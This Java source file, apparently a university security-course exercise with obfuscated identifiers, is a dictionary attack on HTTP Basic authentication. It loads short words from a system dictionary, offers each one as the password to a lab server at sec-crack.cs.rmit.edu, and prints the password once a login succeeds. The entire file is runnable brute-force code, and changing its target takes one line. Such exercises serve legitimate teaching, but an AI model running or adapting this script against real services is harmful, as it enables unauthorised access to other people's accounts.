import java.util.*;
import java.net.*;
import java.io.*;
public class Dictionary {
    boolean f00 = false;
    int f10;
    Vector f20 = new Vector();
    Dictionary() {
        f10 = 0;
        this.m10();
        this.m00();
    }
    public void m00() {
        for ( ; f10 < this.f20.size(); ) {
            f00 = m20();
            if ( f00 == true ) {
                System.out.print ( "The password is: " );
                System.out.println ( ( String ) f20.elementAt ( f10 - 1 ) );
                f10 = f20.size();
            }
        }
    }
    public void m10() {
        String v0;
        try {
            BufferedReader v1;
            v1 = new BufferedReader ( new FileReader (
                                          "/usr/share/lib/dict/words" ) );
            v0 = v1.readLine();
            for ( ; v0 != null; ) {
                if ( v0.length() <= 3 ) {
                    f20.addElement ( v0 );
                }
                v0 = v1.readLine();
            }
        } catch ( IOException v2 ) {}
    }
    public boolean m20() {
        Authenticator.setDefault ( new MyAuthenticator () );
        try {
            URL v3;
            v3 = new URL ( "http://sec-crack.cs.rmit.edu./SEC/2/" );
            HttpURLConnection v4;
            v4 = ( HttpURLConnection ) v3.openConnection();
            v4.connect();
            if ( v4.getResponseMessage().equalsIgnoreCase ( "OK" ) ) {
                return true;
            }
        } catch ( IOException v5 ) {}
        return false;
    }
    public static void main ( String [] v6 ) {
        Dictionary v7;
        v7 = new Dictionary();
    }
    class MyAuthenticator extends Authenticator {
        protected PasswordAuthentication getPasswordAuthentication() {
            String v8;
            v8 = "";
            String v9;
            v9 = ( String ) f20.elementAt ( f10 );
            f10 = f10 + 1;
            return new PasswordAuthentication ( v8, v9.toCharArray() );
        }
    }
}
